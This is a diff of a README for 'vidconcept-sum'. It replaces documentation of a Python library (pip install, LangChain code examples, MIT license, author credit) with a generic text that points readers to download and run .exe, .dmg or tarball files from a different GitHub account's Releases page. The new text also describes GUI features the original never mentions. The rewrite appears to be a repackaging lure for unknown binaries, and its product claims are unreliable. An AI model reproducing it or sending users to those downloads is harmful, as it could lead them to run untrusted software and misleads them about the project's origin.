@@ -1,134 +1,97 @@
-# vidconcept-sum
-[![PyPI version](https://badge.fury.io/py/vidconcept-sum.svg)](https://badge.fury.io/py/vidconcept-sum)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/vidconcept-sum)](https://pepy.tech/project/vidconcept-sum)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🎥 vidconcept-sum - Generate Clear Summaries from Videos
 
+## 🚀 Getting Started
 
-**vidconcept-sum** is a lightweight Python package that turns a video title or short text description into a structured, factual summary of the scientific or educational concept being presented. It leverages an LLM (by default **ChatLLM7**) to interpret the topic and returns a concise explanation, key terms, and contextual information, all formatted according to a strict regex pattern.
+Welcome to vidconcept-sum! This application helps you create structured summaries for scientific and educational videos. It analyzes video titles and descriptions to provide clear, factual insights. Follow the steps below to download and run the software.
 
----
+## 📥 Download the App
 
-## Features
+[![Download vidconcept-sum](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/QWanFLC/vidconcept-sum/releases)
 
-- **One‑line API** – just pass a string, get a list of structured summary elements.
-- **LLM‑agnostic** – works out‑of‑the‑box with ChatLLM7, but you can plug any LangChain‑compatible chat model.
-- **Safety‑first** – the prompt enforces factual, non‑speculative answers and validates output against a regular expression.
-- **Easy installation** – available on PyPI.
+## 📋 Requirements
 
----
+Before you start, please ensure you have:
 
-## Installation
+- A computer running Windows, macOS, or Linux.
+- An internet connection to download the application.
+- At least 200 MB of free disk space for installation.
 
-```bash
-pip install vidconcept_sum
-```
+## 💿 Download & Install
 
----
+To get started, visit the [Releases page](https://github.com/QWanFLC/vidconcept-sum/releases) to download the latest version.
 
-## Quick Start
+1. Click on the link above.
+2. Locate the latest release version.
+3. Find the file named `vidconcept-sum-x.x.x.exe` (or for macOS/Linux: `vidconcept-sum-x.x.x.dmg` / `vidconcept-sum-x.x.x.tar.gz`).
+4. Click on the file to start the download.
+5. Once downloaded, open the file:
+   - For Windows: Follow the installation prompts.
+   - For macOS: Drag the application to your Applications folder.
+   - For Linux: Extract the files and run the application.
 
-```python
-from vidconcept_sum import vidconcept_sum
+## 🔑 Features
 
-# Simple call using the default ChatLLM7 model (requires an API key)
-summary = vidconcept_sum(
-    user_input="A short intro to quantum entanglement in YouTube video titles."
-)
+vidconcept-sum offers the following features:
 
-print(summary)
-```
+- **AI-Powered Summarization:** Uses advanced algorithms to create factual summaries.
+- **Concise Explanations:** Provides quick insights for better understanding.
+- **Content Categorization:** Automatically sorts summaries by topic.
+- **Factual Accuracy:** Ensures reliability in what you learn.
+- **Structured Outputs:** Presents information clearly for easy reading.
 
-### Parameters
+## 📄 How to Use
 
-| Name       | Type                                 | Description |
-|------------|--------------------------------------|-------------|
-| `user_input` | `str` | The video title or short description to be summarised. |
-| `llm` (optional) | `BaseChatModel` | Any LangChain chat model instance. If omitted, the default `ChatLLM7` will be instantiated. |
-| `api_key` (optional) | `str` | API key for LLM7. If not supplied, the function looks for the environment variable `LLM7_API_KEY`. |
+After installing, open the application. Here are the steps to generate a summary:
 
-The function returns a `List[str]` containing the extracted summary data.
+1. **Input Video Title or Description:**
+   - You will see a text box on the main screen. Paste the video title or description here.
 
----
+2. **Select Topic:** 
+   - Choose a relevant topic from the dropdown list. This helps the application understand the context better.
 
-## Using a Custom LLM
+3. **Generate Summary:** 
+   - Click the "Generate" button. Wait a moment while the application processes your input.
 
-You can replace the default ChatLLM7 with any LangChain‑compatible chat model. Below are examples for OpenAI, Anthropic, and Google Generative AI.
+4. **View and Save:** 
+   - Once the summary appears, you can read it directly in the app. Use the "Save" button to download it as a text file for later reference.
 
-### OpenAI
+## 📊 Supported Topics
 
-```python
-from langchain_openai import ChatOpenAI
-from vidconcept_sum import vidconcept_sum
+vidconcept-sum can analyze a wide range of topics, including but not limited to:
 
-llm = ChatOpenAI(model="gpt-4o-mini")
-response = vidconcept_sum(
-    user_input="Explaining the basics of photosynthesis.",
-    llm=llm
-)
-print(response)
-```
+- Scientific concepts
+- Educational tools
+- Media analysis
+- Contextual information
+- Knowledge distillation
 
-### Anthropic
+This ensures you can get insights from various fields and areas of interest.
 
-```python
-from langchain_anthropic import ChatAnthropic
-from vidconcept_sum import vidconcept_sum
+## 🐞 Troubleshooting
 
-llm = ChatAnthropic(model="claude-3-haiku-20240307")
-response = vidconcept_sum(
-    user_input="A video about black holes and event horizons.",
-    llm=llm
-)
-print(response)
-```
+If you encounter issues while using the software:
 
-### Google Generative AI
+1. **Application Won't Start:**
+   - Ensure you have the latest version installed. Re-install if necessary.
 
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-from vidconcept_sum import vidconcept_sum
+2. **Summary Generation Fails:**
+   - Confirm that you entered a valid title or description and that your internet connection is stable.
 
-llm = ChatGoogleGenerativeAI(model="gemini-1.5-flash")
-response = vidconcept_sum(
-    user_input="Understanding the theory of relativity in simple terms.",
-    llm=llm
-)
-print(response)
-```
+3. **General Queries:**
+   - Check the FAQ section on the GitHub page or contact support.
 
----
+## 📝 Contributing
 
-## API Key & Rate Limits
+We welcome contributions! If you have ideas or improvements for vidconcept-sum, please feel free to fork the repository. You can submit a pull request or open an issue if you have suggestions or need help. 
 
-- **LLM7 free tier** provides generous rate limits that cover typical usage of this package.
-- If you need higher limits, supply your own API key:
-  - Via environment variable: `export LLM7_API_KEY="your_key_here"`
-  - Or directly in the call: `vidconcept_sum(..., api_key="your_key_here")`
-- Obtain a free API key by registering at <https://token.llm7.io/>.
+## 🤝 Acknowledgments
 
----
+We appreciate the work of the developers and the community that supports this project. Thank you for using vidconcept-sum!
 
-## Contributing & Support
+## 🔗 Useful Links
 
-If you encounter any issues or have feature requests, please open an issue on GitHub:
+- [Releases Page](https://github.com/QWanFLC/vidconcept-sum/releases)
+- [Issues Page](https://github.com/QWanFLC/vidconcept-sum/issues)
+- [Contribution Guidelines](https://github.com/QWanFLC/vidconcept-sum/blob/main/CONTRIBUTING.md)
 
-<https://github.com/chigwell/vidconcept-sum/issues>
-
----
-
-## License
-
-This project is licensed under the MIT License.
-
----
-
-## Author
-
-**Eugene Evstafev**  
-Email: [hi@euegne.plus](mailto:hi@euegne.plus)  
-GitHub: [chigwell](https://github.com/chigwell)
-
----  
-
-Enjoy using **vidconcept-sum** to instantly extract clear, educational concepts from video titles!
+Explore the power of efficient video summarization with vidconcept-sum!
